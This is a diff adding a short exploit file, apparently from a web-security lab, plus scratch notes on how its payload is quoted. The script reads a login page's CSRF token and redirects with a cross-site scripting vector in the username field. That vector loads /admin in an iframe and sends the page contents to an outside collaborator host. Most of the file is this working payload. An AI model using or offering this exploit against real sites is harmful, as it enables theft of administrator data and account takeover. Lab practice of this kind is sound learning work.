@@ -1,0 +1,32 @@
+<script>
+    function xss(url, text, vector) {
+        location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+    }
+    
+    function fetchUrl(url, collaboratorURL){
+        fetch(url).then(r => r.text().then(text => {
+            xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+        }))
+    }
+    
+    fetchUrl("http://192.168.0.5:8080", "http://thebqwu1v54j9zqnf9zit3tr0i69ubi0.oastify.com");
+</script>
+
+
+<!-- Success -->
+
+// var stringWithQuote = 'This is a string with a single quote: \'meowhecker\'';
+// undefined
+// console.log(stringWithQuote)
+// This is a string with a single quote: 'meowhecker'
+
+parse1 
+
+'"><iframe src=/admin onload="new Image().src=\'' 
++collaboratorURL+
+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">'
+
+parse2  RUN js
+
+
+    "><iframe src=/admin onload="new Image().src='collaboratorURL?code='+encodeURIComponent(this.contentWindow.document.body.innerHTML)"></iframe>
